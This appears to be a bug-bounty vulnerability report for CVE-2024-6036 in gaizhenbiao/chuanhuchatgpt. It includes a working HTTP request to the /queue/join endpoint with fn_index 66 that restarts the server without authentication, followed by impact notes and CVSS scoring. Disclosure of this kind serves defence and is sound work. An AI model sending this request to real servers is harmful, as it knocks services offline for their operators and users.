@@ -1,0 +1,47 @@
+Title: The server can be restarted by any user, any number of times disrupting the whole service. in gaizhenbiao/chuanhuchatgpt
+
+Proof of Concept: 
+Send the following request to the server.
+
+POST /queue/join? HTTP/1.1
+Host: 127.0.0.1:7860
+Cookie:<Cookie_here>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:7860/
+Content-Type: application/json
+Content-Length: 90
+Origin: http://127.0.0.1:7860
+Connection: close
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+
+{"data":[],"event_data":null,"fn_index":66,"trigger_id":null,"session_hash":"9alzfpcb0mt"}
+
+Any request at /queue/join? endpoint with "fn_index":66 restarts the server.
+
+Impact: 
+Service Disruption:Unrestricted server restarts have the potential to severely disrupt service availability, causing significant inconvenience to legitimate users and undermining essential business operations.Data Loss or Corruption:Abrupt server restarts pose a serious risk of data loss or corruption, especially if ongoing operations or transactions are interrupted without appropriate safeguards in place.System Compromise:Repeated unauthorized restarts could destabilize the server environment, leading to system crashes or creating exploitable vulnerabilities that compromise the integrity and security of the entire system.Trust Erosion:Inability to prevent unauthorized server restarts undermines user trust and confidence in the application's reliability and security measures, potentially resulting in reputational damage and loss of user trust.
+
+CVE ID: CVE-2024-6036
+Status: (published)
+Vulnerability Type: CWE-400: Denial of Service
+Severity: High (7.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: None
+Availability: High
+Registry: Other
+Affected Version: 20240410
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $450
+Fix Bounty: $112.5
